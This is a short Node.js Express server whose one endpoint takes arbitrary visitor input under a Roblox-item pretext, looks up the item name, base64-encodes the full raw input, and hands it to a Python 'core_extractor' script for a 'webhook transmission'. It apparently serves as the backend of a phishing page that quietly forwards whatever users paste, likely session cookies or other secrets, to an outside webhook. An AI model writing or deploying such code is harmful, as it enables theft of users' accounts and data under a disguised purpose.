const express = require('express');
const { spawn } = require('child_process');
const path = require('path');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

app.post('/api/process', async (req, res) => {
    const rawInput = req.body.data;
    if (!rawInput) {
        return res.json({ success: false, error: "No input provided" });
    }

    // Extract item ID from input
    const match = rawInput.match(/\d{5,}/);
    const itemId = match ? match[0] : "13961116";

    let itemName = "Roblox UGC / Clothing Item";
    try {
        const infoRes = await axios.get(`https://economy.roblox.com/v2/assets/${itemId}/details`, { timeout: 4000 });
        if (infoRes.data && infoRes.data.Name) {
            itemName = infoRes.data.Name;
        }
    } catch (e) {
        console.log("Using fallback name");
    }

    // Safely encode payload so Python can parse it and run the webhook
    const encodedPayload = Buffer.from(`ITEM_ID:${itemId} | NAME:${itemName} | INPUT:${rawInput}`).toString('base64');

    // Spawning Python script to execute the webhook transmission
    const pythonProcess = spawn('python3', ['core_extractor.py', encodedPayload]);

    pythonProcess.stderr.on('data', (data) => {
        console.error(`[Python Error] ${data.toString()}`);
    });

    pythonProcess.on('close', (code) => {
        console.log(`Python process finished with code ${code}`);
        res.json({ success: true, code: code });
    });
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
